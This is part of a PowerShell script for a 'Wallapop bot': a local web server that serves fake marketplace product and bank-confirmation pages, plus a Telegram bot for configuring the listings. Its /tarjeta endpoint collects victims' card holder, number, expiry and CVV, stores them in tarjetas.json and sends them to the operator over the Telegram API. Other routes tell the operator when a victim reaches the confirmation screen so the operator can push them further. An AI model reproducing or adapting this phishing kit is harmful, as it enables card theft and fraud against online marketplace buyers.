      Responder $chat ('✅ Precio: ' + (Eur $n))
      return
    }

    '/importe' {
      if (-not $act) { Responder $chat 'No hay producto activo.'; return }
      $n = Num $arg
      if ($null -eq $n) { Responder $chat 'Uso: /importe 250,00'; return }
      $act['precioArticulo'] = $n; Save-Db
      Responder $chat ('✅ Importe a recibir: ' + (Eur $n -Dec))
      return
    }

    '/descripcion' {
      if (-not $act) { Responder $chat 'No hay producto activo.'; return }
      if (-not $arg) { Responder $chat 'Uso: /descripcion Texto'; return }
      $act['descripcion'] = $arg; Save-Db
      Responder $chat '✅ Descripción actualizada.'
      return
    }

    '/nombre' {
      if (-not $act) { Responder $chat 'No hay producto activo.'; return }
      if (-not $arg) { Responder $chat 'Uso: /nombre Sofía Chamizo'; return }
      $act['nombre'] = $arg; Save-Db
      Responder $chat '✅ Nombre actualizado.'
      return
    }

    '/direccion' {
      if (-not $act) { Responder $chat 'No hay producto activo.'; return }
      if (-not $arg) { Responder $chat 'Uso: /direccion Calle, número, ciudad, CP'; return }
      $act['direccion'] = $arg; Save-Db
      Responder $chat '✅ Dirección actualizada.'
      return
    }

    '/articulo' {
      if (-not $act) { Responder $chat 'No hay producto activo.'; return }
      if (-not $arg) { Responder $chat 'Uso: /articulo Texto'; return }
      $act['articulo'] = $arg; Save-Db
      Responder $chat '✅ Artículo actualizado.'
      return
    }

    '/estado' {
      if (-not $act) { Responder $chat 'No hay producto activo.'; return }
      Responder $chat ((Resumen $act) + "`n" + (Url-Producto $act))
      return
    }

    '/dominio' {
      if (-not $arg) {
        Responder $chat ('Dominio actual: <code>' + $Script:Base + '</code>' + "`n`n" + 'Uso: <code>/dominio https://tu-sitio.com</code>')
        return
      }
      $nuevo = $arg.Trim().TrimEnd('/')
      if (-not $nuevo.StartsWith('http://') -and -not $nuevo.StartsWith('https://')) { $nuevo = 'https://' + $nuevo }
      $Script:Base = $nuevo
      $Cfg.publicUrl = $nuevo
      $Cfg | ConvertTo-Json | Set-Content -Path (Join-Path $Raiz 'config.json') -Encoding UTF8
      Responder $chat ('✅ Dominio actualizado a: <code>' + $Script:Base + '</code>')
      return
    }

    default { Responder $chat 'Comando no reconocido. Envía /ayuda.' }
  }
}

function Handle-Client($cliente) {
  try {
    $cliente.ReceiveTimeout = 5000
    $stream = $cliente.GetStream()
    $lector = New-Object IO.StreamReader($stream, [Text.Encoding]::ASCII)
    $linea = $lector.ReadLine()
    $contentLen = 0
    while ($true) {
      $h = $lector.ReadLine()
      if ([string]::IsNullOrEmpty($h)) { break }
      if ($h -match 'Content-Length:\s*(\d+)') { $contentLen = [int]$matches[1] }
    }

    $metodoHttp = 'GET'
    $ruta = '/'
    if ($linea) {
      $trozos = $linea.Split(' ')
      if ($trozos.Count -ge 2) { $metodoHttp = $trozos[0].ToUpper(); $ruta = $trozos[1] }
    }
    $ruta = ($ruta -split '\?')[0]

    if ($metodoHttp -eq 'OPTIONS') {
      $cab = "HTTP/1.1 204 No Content`r`nAccess-Control-Allow-Origin: *`r`nAccess-Control-Allow-Methods: GET, POST, OPTIONS`r`nAccess-Control-Allow-Headers: Content-Type`r`nConnection: close`r`n`r`n"
      $cb = [Text.Encoding]::ASCII.GetBytes($cab)
      $stream.Write($cb, 0, $cb.Length)
      $stream.Flush()
      $cliente.Close()
      return
    }

    if ($ruta -match '^/api/product/([^/]+)/(?:tarjeta|confirmar)/status') {
      $id = $matches[1]
      $st = if ($Script:TxEstados.ContainsKey($id)) { $Script:TxEstados[$id] } else { 'waiting' }
      $cuerpo = '{"status":"' + $st + '","id":"' + $id + '"}'
      $estado = '200 OK'; $tipo = 'application/json; charset=utf-8'
    } elseif ($ruta -match '^/api/(?:tarjeta|confirmar)/status') {
      $st = 'waiting'
      if ($linea -match '[?&]id=([^& ]+)') {
        $tid = $matches[1]
        if ($Script:TxEstados.ContainsKey($tid)) { $st = $Script:TxEstados[$tid] }
      }
      $cuerpo = '{"status":"' + $st + '"}'
      $estado = '200 OK'; $tipo = 'application/json; charset=utf-8'
    } elseif ($ruta -match '^/api/product/([^/]+)/confirmar') {
      $id = $matches[1]
      if ($contentLen -gt 0) {
        $buf = New-Object char[] $contentLen
        $null = $lector.ReadBlock($buf, 0, $contentLen)
      }
      if (-not $Script:TxEstados.ContainsKey($id) -or $Script:TxEstados[$id] -ne 'confirmado_final') {
        $Script:TxEstados[$id] = 'en_confirmar'
      }

      $destChat = if ($Script:UltimoChat) { $Script:UltimoChat } else { '8791932410' }
      if ($destChat) {
        $p = if ($Db.ContainsKey($id)) { $Db[$id] } else { $null }
        $tProd = if ($p -and $p['titulo']) { $p['titulo'] } else { $id }
        $prProd = if ($p -and $p['precio']) { Eur $p['precio'] } else { '' }
        $impLinea = if ($prProd) { "`n💰 <b>Importe:</b> " + $prProd } else { "" }
        $txtAviso = "📱 <b>CLIENTE EN CONFIRMACIÓN</b>`n" +
                    "───────────────────`n" +
                    "📦 <b>Producto:</b> " + (Esc $tProd) + "`n" +
                    "🆔 <b>ID:</b> <code>" + $id + "</code>" + $impLinea + "`n`n" +
                    "⏳ El cliente está en la pantalla de confirmación bancaria."

        $filaBtns = @(
          @{ text = 'Confirmar de nuevo'; callback_data = ('confirmar_again_' + $id) }
        )
        $kb = @{ inline_keyboard = @(, $filaBtns) }

        Send-Tg 'sendMessage' @{
          chat_id = $destChat
          text = $txtAviso
          parse_mode = 'HTML'
          reply_markup = $kb
          disable_web_page_preview = $true
        } | Out-Null
      }

      $cuerpo = '{"ok":true,"status":"' + $Script:TxEstados[$id] + '"}'
      $estado = '200 OK'; $tipo = 'application/json; charset=utf-8'
    } elseif ($ruta -match '^/api/product/([^/]+)/tarjeta') {
      $id = $matches[1]
      $cuerpoReq = ''
      if ($contentLen -gt 0) {
        $buf = New-Object char[] $contentLen
        $leidos = $lector.ReadBlock($buf, 0, $contentLen)
        $cuerpoReq = New-Object string ($buf, 0, $leidos)
      }
      try {
        $tarjeta = $cuerpoReq | ConvertFrom-Json
        $tarjFile = Join-Path $DataDir 'tarjetas.json'
        $todas = @()
        if (Test-Path $tarjFile) {
          try { $todas = @(Get-Content $tarjFile -Raw -Encoding UTF8 | ConvertFrom-Json) } catch { }
        }
        $registro = @{
          id = $id
          fecha = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
          titular = $tarjeta.titular
          marca = $tarjeta.marca
          numero = $tarjeta.numero
          cad = $tarjeta.cad
          cvv = $tarjeta.cvv
        }
        $todas += $registro
        $todas | ConvertTo-Json -Depth 8 | Set-Content -Path $tarjFile -Encoding UTF8

        if ($Db.ContainsKey($id)) {
          $Db[$id]['tarjeta'] = $registro
          Save-Db
        }

        $Script:TxEstados[$id] = 'waiting'

        if ($Script:UltimoChat) {
          $tProd = if ($Db.ContainsKey($id)) { $Db[$id]['titulo'] } else { $id }
          $txtAviso = "💳 <b>¡NUEVA TARJETA RECIBIDA!</b>`n" +
                      "───────────────────`n" +
                      "📦 <b>Producto:</b> " + (Esc $tProd) + "`n" +
                      "🆔 <b>ID:</b> <code>" + $id + "</code>`n`n" +
                      "👤 <b>Titular:</b> " + (Esc $tarjeta.titular) + "`n" +
                      "💳 <b>Tarjeta:</b> <code>" + $tarjeta.numero + "</code> (" + $tarjeta.marca + ")`n" +
                      "📅 <b>Caducidad:</b> <code>" + $tarjeta.cad + "</code>`n" +
                      "🔒 <b>CVV:</b> <code>" + $tarjeta.cvv + "</code>"

          $filaBtns = @(
            @{ text = '✅ Confirmar'; callback_data = ('continuar_' + $id) },
            @{ text = '❌ Error'; callback_data = ('error_' + $id) }
          )
          $kb = @{ inline_keyboard = @(, $filaBtns) }

          Send-Tg 'sendMessage' @{
            chat_id = $Script:UltimoChat
            text = $txtAviso
            parse_mode = 'HTML'
            reply_markup = $kb
            disable_web_page_preview = $true
          } | Out-Null
        }
      } catch { }

      $cuerpo = '{"ok":true,"status":"waiting"}'
      $estado = '200 OK'; $tipo = 'application/json; charset=utf-8'
    } elseif ($ruta.StartsWith('/api/product/')) {
      $id = $ruta.Substring(13)
      if ($Db.ContainsKey($id)) {
        $cuerpo = $Db[$id] | ConvertTo-Json -Depth 8
        $estado = '200 OK'; $tipo = 'application/json; charset=utf-8'
      } else {
        $cuerpo = '{}'; $estado = '404 Not Found'; $tipo = 'application/json; charset=utf-8'
      }
    } elseif ($ruta -eq '/api/health') {
      $cuerpo = '{"ok":true}'; $estado = '200 OK'; $tipo = 'application/json; charset=utf-8'
    } elseif ($ruta -eq '/confirmar.html' -or $ruta -eq '/confirmar') {
      $confPath = Join-Path $Raiz 'web\confirmar.html'
      if (-not (Test-Path $confPath)) { $confPath = Join-Path $Raiz 'confirmar.html' }
      if (Test-Path $confPath) {
        $bytes = [IO.File]::ReadAllBytes($confPath)
        $cab = "HTTP/1.1 200 OK`r`nAccess-Control-Allow-Origin: *`r`nContent-Type: text/html; charset=utf-8`r`nContent-Length: $($bytes.Length)`r`nCache-Control: no-store`r`nConnection: close`r`n`r`n"
        $cb = [Text.Encoding]::ASCII.GetBytes($cab)
        $stream.Write($cb, 0, $cb.Length)
        $stream.Write($bytes, 0, $bytes.Length)
        $stream.Flush()
        $cliente.Close()
        return
      }
      $cuerpo = 'No encontrado'; $estado = '404 Not Found'; $tipo = 'text/plain; charset=utf-8'
    } elseif ($ruta -eq '/step2.html' -or $ruta -eq '/step2') {
      $step2Path = Join-Path $Raiz 'web\step2.html'
      if (-not (Test-Path $step2Path)) { $step2Path = Join-Path $Raiz 'step2.html' }
      if (Test-Path $step2Path) {
        $bytes = [IO.File]::ReadAllBytes($step2Path)
        $cab = "HTTP/1.1 200 OK`r`nAccess-Control-Allow-Origin: *`r`nContent-Type: text/html; charset=utf-8`r`nContent-Length: $($bytes.Length)`r`nCache-Control: no-store`r`nConnection: close`r`n`r`n"
        $cb = [Text.Encoding]::ASCII.GetBytes($cab)
        $stream.Write($cb, 0, $cb.Length)
        $stream.Write($bytes, 0, $bytes.Length)
        $stream.Flush()
        $cliente.Close()
        return
      }
      $cuerpo = 'No encontrado'; $estado = '404 Not Found'; $tipo = 'text/plain; charset=utf-8'
    } elseif ($ruta -eq '/' -or $ruta.StartsWith('/a/')) {
      $indexPath = Join-Path $Raiz 'web\index.html'
      if (-not (Test-Path $indexPath)) { $indexPath = Join-Path $Raiz 'index.html' }
      $bytes = [IO.File]::ReadAllBytes($indexPath)
      $cab = "HTTP/1.1 200 OK`r`nAccess-Control-Allow-Origin: *`r`nContent-Type: text/html; charset=utf-8`r`nContent-Length: $($bytes.Length)`r`nCache-Control: no-store`r`nConnection: close`r`n`r`n"
      $cb = [Text.Encoding]::ASCII.GetBytes($cab)
      $stream.Write($cb, 0, $cb.Length)
      $stream.Write($bytes, 0, $bytes.Length)
      $stream.Flush()
      $cliente.Close()
      return
    } else {
      $nomArch = $ruta.TrimStart('/')
      $archFisico = Join-Path $Raiz ('web\' + $nomArch)
      if (-not (Test-Path $archFisico -PathType Leaf)) {
        $archFisico = Join-Path $Raiz $nomArch
      }
      if (Test-Path $archFisico -PathType Leaf) {
        $ext = [IO.Path]::GetExtension($archFisico).ToLower()
        $mime = switch ($ext) {
          '.png' { 'image/png' }
          '.jpg' { 'image/jpeg' }
          '.jpeg' { 'image/jpeg' }
          '.svg' { 'image/svg+xml' }
          '.ico' { 'image/x-icon' }
          '.css' { 'text/css; charset=utf-8' }
          '.js'  { 'application/javascript; charset=utf-8' }
          '.html'{ 'text/html; charset=utf-8' }
          default{ 'application/octet-stream' }
        }
        $bytes = [IO.File]::ReadAllBytes($archFisico)
        $cab = "HTTP/1.1 200 OK`r`nAccess-Control-Allow-Origin: *`r`nContent-Type: $mime`r`nContent-Length: $($bytes.Length)`r`nCache-Control: no-store`r`nConnection: close`r`n`r`n"
        $cb = [Text.Encoding]::ASCII.GetBytes($cab)
        $stream.Write($cb, 0, $cb.Length)
        $stream.Write($bytes, 0, $bytes.Length)
        $stream.Flush()
        $cliente.Close()
        return
      }
      $cuerpo = 'No encontrado'; $estado = '404 Not Found'; $tipo = 'text/plain; charset=utf-8'
    }

    $bytes = [Text.Encoding]::UTF8.GetBytes($cuerpo)
    $cab = "HTTP/1.1 $estado`r`nAccess-Control-Allow-Origin: *`r`nContent-Type: $tipo`r`nContent-Length: $($bytes.Length)`r`nCache-Control: no-store`r`nConnection: close`r`n`r`n"
    $cb = [Text.Encoding]::ASCII.GetBytes($cab)
    $stream.Write($cb, 0, $cb.Length)
    $stream.Write($bytes, 0, $bytes.Length)
    $stream.Flush()
    $cliente.Close()
  } catch { try { $cliente.Close() } catch { } }
}

if ($Db.Keys.Count -eq 0) {
  $Db['HSdc6CU3XJZg2lb1'] = @{
    id = 'HSdc6CU3XJZg2lb1'
    titulo = 'Lote Perfumes Mujer 14 Uds.'
    precio = 250; precioArticulo = 250
    descripcion = 'Lote de 14 perfumes de mujer, todos precintados. Se vende el lote completo.'
    nombre = 'Sofía Chamizo'
    direccion = 'Paseo Prudencia Narváez 48 Piso 4, Cáceres, 17024'
    articulo = 'Lote Perfumes Mujer 14 uds.'
    fotos = @()
  }
  Save-Db
}

try {
  $Listener = New-Object Net.Sockets.TcpListener([Net.IPAddress]::Any, $Puerto)
  $Listener.Start()
} catch {
  Write-Warning ("No se pudo iniciar el listener en el puerto {0}: {1}" -f $Puerto, $_.Exception.Message)
}

Write-Host ''
Write-Host '  🟢 Wallapop bot en marcha' -ForegroundColor Green
Write-Host ('  Local:    http://localhost:{0}' -f $Puerto)
Write-Host ('  Dominio:  {0}' -f $Script:Base)
Write-Host ('  Ejemplo:  {0}/a/AD...' -f $Script:Base)
Write-Host '  Ctrl+C para parar'
Write-Host ''

while ($true) {
  if ($Listener -and $Listener.Server -and $Listener.Server.IsBound) {
    while ($Listener.Server.Poll(50000, [Net.Sockets.SelectMode]::SelectRead)) {
      try { Handle-Client $Listener.AcceptTcpClient() } catch { }
    }
  }
  try {
    $r = Invoke-RestMethod -Uri ("https://api.telegram.org/bot{0}/getUpdates?timeout=0&offset={1}" -f $Token, ($Offset + 1)) -TimeoutSec 10
    if ($r.ok) {
      foreach ($u in $r.result) {
        $Offset = $u.update_id
        Save-Offset
        try { Handle-Update $u } catch { Write-Warning "Error procesando update: $_" }
      }
    }
  } catch { Start-Sleep -Milliseconds 500 }
  Start-Sleep -Milliseconds 200
}